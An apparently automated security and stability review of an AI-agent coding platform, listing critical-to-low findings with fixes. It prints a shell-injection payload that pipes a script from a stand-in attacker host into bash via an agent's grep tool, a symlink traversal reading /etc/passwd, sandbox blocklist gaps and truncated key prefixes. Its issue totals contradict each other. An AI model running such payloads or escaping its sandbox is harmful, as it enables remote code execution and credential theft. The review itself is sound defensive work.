# ExecuteSpec — Code Review
**Date:** 2026-03-06
**Scope:** Full codebase — backend (11 files), frontend (10 files), security/config/prompts
**Reviewer:** Automated multi-agent review

---

## Executive Summary

The codebase demonstrates solid architectural thinking — virtual threads, worktree isolation, Redis-backed gates, multi-tier auth — but has accumulated debt across three categories:

| Category | Critical | High | Medium | Low |
|----------|---------|------|--------|-----|
| **Security** | 4 | 5 | 7 | 4 |
| **Backend stability** | — | 18 | 22 | 14 |
| **Frontend correctness** | — | 5 | 18 | 12 |
| **Total** | **4** | **28** | **47** | **30** |

The four **CRITICAL** items are all in security and must be fixed before any production deployment.

---

## CRITICAL — Fix Before Deployment

### C1 · Hardcoded API Keys in `application.yml`
Real, live keys embedded as default values. Anyone with repo access or who can read the running process environment can steal them.
```yaml
# Lines 39, 45, 52, 77
ANTHROPIC_API_KEY: sk-ant-api03-Ax-IlF...   ← live key
OPENAI_API_KEY:    sk-proj-Xfl3PBY...        ← live key
GOOGLE_API_KEY:    AIzaSyCjIge3...            ← live key
GITHUB_PAT:        ghp_mIZdpFt...            ← live PAT
```
**Fix:** Change all four to `${VAR:}` (colon, no default). Rotate all four keys immediately. Document that these are mandatory env vars.

---

### C2 · Unauthenticated SSE Endpoint
`/api/runs/*/events` is `permitAll()` in `SecurityConfig`. `SseController` performs no auth check. Any anonymous caller can subscribe to any run's live event stream — seeing file names, compiler errors, source snippets, commands.

**Fix:**
```java
// SseController — add before emitting
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
runVisibilitySpec.assertCanRead(auth, runId); // reuse existing spec
```

---

### C3 · Plaintext Credential Storage (`AppUser.java` lines 82–121)
`githubPat`, `openAiApiKey`, `anthropicApiKey`, `geminiApiKey`, `jiraApiToken`, `confluenceApiToken` all stored as plaintext columns. A DB breach exposes every user's production API keys.

**Fix (short-term):** Add AES-256 column encryption via JPA AttributeConverter with key from Secret Manager.
**Fix (long-term):** Move org-level keys to Secret Manager; never store in DB.

---

### C4 · Shell Injection in `FileSystemTool.searchFiles()` (line ~180)
```java
// grep pattern passed to bash -c without escaping
ProcessBuilder("bash", "-c", "grep -r \"" + pattern + "\"")
```
A model-injected pattern like `"; curl attacker.com/shell.sh | bash; echo "` achieves RCE.

**Fix:**
```java
// Use ProcessBuilder array form — no shell expansion
new ProcessBuilder("grep", "-rn", "--include=*.java", pattern, directory)
```

---

## HIGH — Fix This Sprint

### H1 · Path Traversal via Symlinks (`FileSystemTool`, `GitTool`)
`Path.normalize()` does **not** resolve symlinks. A worker that creates `workspace/run1/link -> ../../` then calls `readFile("link/../../../etc/passwd")` reads outside the sandbox.

**Fix:** Replace `normalize()` with `toRealPath()` (follows symlinks, throws if escape). Add test with symlink fixture.

---

### H2 · Semaphore Leak in `PipelineHarness` Gate Wait (lines ~729–733)
```java
// Pattern used in both plan-gate and merge-gate sections:
try { runSlots.release(); ... }
finally { runSlots.acquire(); }  // if this throws InterruptedException, slot lost forever
```
After ~5 interrupted threads the semaphore is exhausted and no new runs start.

**Fix:**
```java
finally {
    boolean reacquired = false;
    while (!reacquired) {
        try { runSlots.acquire(); reacquired = true; }
        catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
    }
}
```

---

### H3 · `StateStore` Multi-Step Operations Not Transactional (lines ~73–89)
`savePlan()` saves the run, then creates tasks one-by-one. An exception on task 3 leaves a run with 2 tasks in the DB — visible to the poller, which spins forever.

**Fix:** Annotate `savePlan()` with `@Transactional` and create tasks inside a `saveAll()` batch call.

---

### H4 · Race Condition in `GateStore.getAndDelete()` (Redis)
```java
String val = redis.opsForValue().getAndDelete(key); // not atomic pre-Redis 6.2
```
Two pipeline threads for the same runId (e.g., restart scenario) both get the value; both unblock.

**Fix:** Use a Lua script or `SET ... GET` + `DEL` inside a pipeline to make this atomic. Or upgrade to Redis 6.2+ `GETDEL`.

---

### H5 · Unauthorized File Download (`RunController` line ~309)
`GET /api/runs/{runId}/download` and `GET /api/runs/{runId}/file?path=` do not verify the requesting user owns the run. Any logged-in user can download any workspace.

**Fix:**
```java
runVisibilitySpec.assertCanRead(currentUser(), runId);
```
Add to both endpoints. Also validate the `path` param against the workspace root before passing to `WorkspaceFileService`.

---

### H6 · `LlmRouter` Blocks Pipeline Thread During Rate-Limit Sleep
```java
Thread.sleep(15_000);  // blocks the virtual thread — fine for VT
// BUT: blocks all other callers waiting on the same Semaphore slot
```
Virtual threads park efficiently, but holding a `runSlots` semaphore permit during 15–30 s sleep prevents other runs from starting.

**Fix:** Release the semaphore before sleeping, reacquire after. Or move retry backoff outside the critical section.

---

### H7 · `WorkerAgent` Tool Output Truncation is Silent
```java
if (result.length() > 8192) result = result.substring(0, 8192) + "\n[TRUNCATED]";
```
The model sees `[TRUNCATED]` but gets no guidance. It often fabricates the missing section rather than requesting a specific range.

**Fix:** Append: `[TRUNCATED — use run_command with 'sed -n "200,400p" file' to read specific line ranges]`

---

### H8 · `useSse.ts` Missing `useEffect` Dependencies (line ~105)
```ts
useEffect(() => { /* uses setStatus, addEntry, fetchRun, ... */ }, [runId]);
```
Zustand functions are stable references so this works today, but it's fragile. Any refactor that changes function identity will cause stale closures that drop SSE events silently.

**Fix:** Add all consumed store functions to the dependency array, or extract them from the store outside the effect.

---

## MEDIUM — Fix Next Sprint

### Backend

| # | File | Issue | Lines |
|---|------|-------|-------|
| M1 | `PipelineHarness` | `performMergeOnRestart()` — no null-check on `getReviewJson()` before parse | ~354 |
| M2 | `PipelineHarness` | SSE emit failures caught but not metered; silent in production | ~278–313 |
| M3 | `WorkerAgent` | `parseXmlToolCalls()` catches all exceptions and returns empty list; model never learns tool call was malformed | ~293 |
| M4 | `WorkerAgent` | `looksLikeCompletionReport()` only checks `{` prefix — invalid JSON passes, then `parseCompletionReport()` throws, task marked PARTIAL silently | ~217 |
| M5 | `LlmRouter` | Rate-limit sleep has no jitter; all retrying tasks wake simultaneously → thundering herd | ~130–155 |
| M6 | `LlmRouter` | `buildModelForUserKey()` constructs a new `ChatModel` per call with no resource cleanup if call fails → connection leak | ~190–246 |
| M7 | `LlmRouter` | Overload detection matches string `"overloaded"` or `"529"` — too broad; matches nested exception messages | ~364 |
| M8 | `GateStore` | 500 ms poll has no jitter; with 5+ concurrent runs, Redis sees a spike every 500 ms | ~48, 90–125 |
| M9 | `GitTool` | Worktree reuse skips cleanliness check — retry could start in conflicted state | ~56–59 |
| M10 | `GitTool` | `ProcessBuilder.waitFor()` has no timeout; git clone/merge can hang indefinitely | multiple |
| M11 | `StateStore` | `completeTask()` is a read-modify-write with no optimistic locking — concurrent retries corrupt token totals | ~229–247 |
| M12 | `StateStore` | `addTokensToRun()` not idempotent — called twice for same worker doubles cost | ~251–257 |
| M13 | `StateStore` | Task statuses use string literals (`"COMPLETE"`, `"FAILED"`) throughout; a typo is invisible at compile time | everywhere |
| M14 | `StuckRunMonitor` | `@Scheduled` method has no exception handler — one failure stops all future stuck detection | ~37 |
| M15 | `StuckRunMonitor` | Tasks waiting on a dep (legitimately idle) are flagged as stuck | ~42–51 |
| M16 | `PreviewAgent` | Dockerfile/compose written non-atomically — partial write on crash leaves corrupt files | ~182 |
| M17 | `ShellTool` | `ShellSandboxPolicy` blocklist misses `perl -e`, `eval`, `nmap`, `sqlmap` | ~27–40 |
| M18 | `ShellTool` | Secret env-var names are hardcoded; any new secret added to yml is leaked to child processes | ~71–82 |

### Frontend

| # | File | Issue | Lines |
|---|------|-------|-------|
| M19 | `api.ts` | `reqText()` silently falls back to `statusText` on body-read failure; error detail lost | ~35 |
| M20 | `api.ts` | `any` types on plan/review JSON parse; malformed backend JSON not caught at compile time | ~243, 388 |
| M21 | `useRunStore` | `setActiveRunId` fires fetch but swallows error; UI shows no loading failure state | ~42 |
| M22 | `useUiStore` | `setTimeout` for toast auto-dismiss not stored; cannot be cancelled; timer leak | ~37 |
| M23 | `useSse` | Reconnect backoff array is fixed, not randomized — multiple tabs reconnect in lockstep | ~6, 92 |
| M24 | `useSse` | `getMessages` failure silently produces empty log with no user indication | ~29–38 |
| M25 | `LiveLog` | File-op detection regex won't match paths with spaces or deep nesting | ~22–39 |
| M26 | `RunDetailTabs` | File tree has no depth limit — deeply nested paths cause unbounded recursion in `buildFileTree()` | ~481–521 |
| M27 | `RunDetailTabs` | No `AbortController` on file load — rapid file switching shows wrong content briefly | ~785–797 |
| M28 | `RunDetailTabs` | DockerPreview polling uses stale `runId` closure if `runId` prop changes mid-poll | ~1119–1159 |
| M29 | `TaskGraph` | Polling continues on error with no backoff — spams API on server errors | ~50–55 |
| M30 | `RunConversation` | Failed send removes optimistic message with no inline error | ~68–89 |
| M31 | `RunConversation` | `buildSuggestedRequest()` iterates messages on every click, not memoized | ~99 |

---

## LOW — Backlog

### Security / Config
- `application.yml` line 217: JWT secret has a hardcoded dev fallback — must be mandatory in prod
- `application.yml` line 119: GCP project ID visible in default config
- `SecurityConfig`: CORS `allowedHeaders: ["*"]` — restrict to `Content-Type, Authorization`
- `AuthService`: 24 h access token TTL means stolen tokens stay valid until expiry after logout
- `AuthService`: Password-reset token re-use not race-condition-safe (no DB-level unique constraint)
- No rate limiting on `/api/auth/**` — login brute-force and registration spam possible
- `FileSystemTool` blocked-filenames list missing `*.pem`, `*.key`, `.kube/config`, `*.env.local`
- `AgentProperties`: Compaction default thresholds (0.65/0.75/0.90) differ from `application.yml` (0.25/0.35/0.55) — unclear which wins

### Backend
- `PipelineHarness`: Log level on user prompt should be `debug`, not `info`
- `WorkerAgent`: Iteration counter not reset after compaction — metrics show inflated iteration counts
- `WorkerAgent`: Cache hit/miss stats logged but never persisted; not visible in UI post-run
- `LlmRouter`: New `ChatModel` built on every per-run-key call — heavy object creation, GC pressure
- `GateStore`: `POLL_MS` hardcoded at 500 ms; should be configurable
- `StateStore`: `findByRunId()` fetches entire task list with no pagination — OOM risk on large runs
- `RunController`: No audit log on `/approve` and `/merge` — no record of who made decisions
- `StuckRunMonitor`: No metrics on detection/recovery counts
- `PreviewAgent`: Hardcoded port 18080 in docker-compose — may conflict with user app

### Frontend
- `api.ts` line 525: `name.split('.').pop()!` — unsafe non-null assertion; use `?? ''`
- `LiveLog`: Scroll listener missing `{ passive: true }` flag — blocks browser scroll optimization
- `RunDetailTabs`: `dangerouslySetInnerHTML` from `hljs.highlight()` — low risk but worth auditing if highlight.js plugins are added
- `RunConversation`: `MAX_MESSAGES = 10` hardcoded; should come from backend response
- `RunConversation`: Fragile `e.message?.includes('429')` check — use HTTP status code instead
- `TaskGraph`: Graph layout positions recalculated on every render — memoize with `useMemo`
- `TaskGraph`: Tooltip not debounced — flickers on rapid mouse movement
- `GlowDot`: Two absolute-positioned spans cause layout shift — use CSS animation instead

---

## Prioritised Action List

### Immediate (before next demo / prod deploy)
```
[ ] C1  Rotate and remove all hardcoded API keys from application.yml
[ ] C2  Add JWT auth check to SseController (3 lines + unit test)
[ ] C3  Add AES-256 AttributeConverter for AppUser credential columns
[ ] C4  Fix searchFiles grep injection — switch to ProcessBuilder array form
[ ] H5  Add runVisibilitySpec check to /download and /file?path= endpoints
```

### Sprint 1
```
[ ] H1  Replace normalize() with toRealPath() in FileSystemTool + GitTool
[ ] H2  Fix semaphore leak in PipelineHarness gate-wait finally blocks
[ ] H3  Make StateStore.savePlan() @Transactional with batch task insert
[ ] H4  Make GateStore.getAndDelete() atomic (Lua script or GETDEL)
[ ] H6  Release runSlots semaphore before LlmRouter rate-limit sleep
[ ] H7  Append actionable hint to truncated tool output
[ ] H8  Add useSse.ts useEffect dependencies
[ ] M14 Wrap StuckRunMonitor @Scheduled body in try-catch with log
[ ] M11 Add @Version optimistic locking to AgentTask for completeTask()
[ ] M13 Extract task status strings to an enum or constants class
```

### Sprint 2
```
[ ] M1–M5   PipelineHarness / WorkerAgent null-safety and error propagation
[ ] M6–M8   LlmRouter resource cleanup, jitter on backoff, overload detection
[ ] M9–M10  GitTool worktree cleanliness check + ProcessBuilder timeout
[ ] M17–M18 ShellSandboxPolicy extended blocklist + configurable secret names
[ ] M19–M31 Frontend error states, AbortController, memoization, polling backoff
[ ] SEC-1   Reduce JWT access token TTL from 1440 min → 15 min
[ ] SEC-2   Add rate limiting on /api/auth/** (Spring Security or Bucket4j)
[ ] SEC-3   Restrict CORS allowedHeaders to explicit list
```

### Backlog
```
[ ] Credential encryption at rest (migrate AppUser columns)
[ ] Audit log for approve/merge decisions
[ ] Pagination on StateStore.findByRunId()
[ ] Memoize TaskGraph layout
[ ] Debounce TaskGraph tooltip
[ ] Make POLL_MS configurable in GateStore
[ ] Frontend: replace all `any` types with proper interfaces
[ ] Frontend: add AbortController to all concurrent-load paths
```

---

## Files With No Issues Found
- `AgentModelConfig.java` — minor (nullable bean, no startup key validation), otherwise clean
- `WebConfig.java` — no issues
- `GlowDot.tsx` — trivial layout concern only
- `reviewer.txt` prompt — excellent, no issues
- `planner.txt` prompt — excellent after compilation dep rule addition
- `worker.txt` prompt — excellent after worktree isolation rule addition

---

*Generated from parallel review of 21 source files. Total issues: 4 CRITICAL · 8 HIGH · 31 MEDIUM · 30 LOW.*
